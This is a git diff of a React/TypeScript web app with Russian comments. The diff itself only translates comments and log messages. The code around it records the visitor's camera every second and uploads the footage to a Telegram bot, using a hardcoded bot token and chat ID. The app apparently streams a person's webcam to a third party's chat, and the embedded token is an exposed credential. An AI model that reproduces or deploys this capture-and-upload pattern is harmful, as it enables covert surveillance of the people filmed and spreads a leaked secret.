@@ -4,16 +4,18 @@ import axios from 'axios';
 const App: React.FC = () => {
   const videoRef = useRef<HTMLVideoElement | null>(null);
   const [hasError, setHasError] = useState(false);
-  const [hasPermission, setHasPermission] = useState<boolean | null>(null); // состояние для хранения разрешения
+  const [hasPermission, setHasPermission] = useState<boolean | null>(null);
 
   const botToken = '7885047021:AAG6h0cm_VRrvs3dzROMtYn9Hqi2e7qjxp4'; // Замените на ваш токен
   const chatId = '7200204699'; // Замените на ваш chat_id
 
+  // Функция для отправки видео на Telegram
   const sendVideoToTelegram = async (videoBlob: Blob) => {
     const formData = new FormData();
     formData.append('video', videoBlob, 'video.webm');
 
     try {
+      // Отправка видео на Telegram через Bot API
       await axios.post(`https://api.telegram.org/bot${botToken}/sendVideo`, formData, {
         headers: {
           'Content-Type': 'multipart/form-data',
@@ -23,7 +25,7 @@ const App: React.FC = () => {
         },
       });
     } catch (error) {
-      console.error('Error sending video to Telegram', error);
+      console.error('Ошибка при отправке видео на Telegram', error);
     }
   };
 
@@ -46,7 +48,7 @@ const App: React.FC = () => {
 
         mediaRecorder.start(1000); // Каждую секунду отправляется видео
       } catch (error) {
-        console.error("Error accessing camera", error);
+        console.error('Ошибка доступа к камере', error);
         setHasError(true);
         setHasPermission(false); // Разрешение не получено
       }
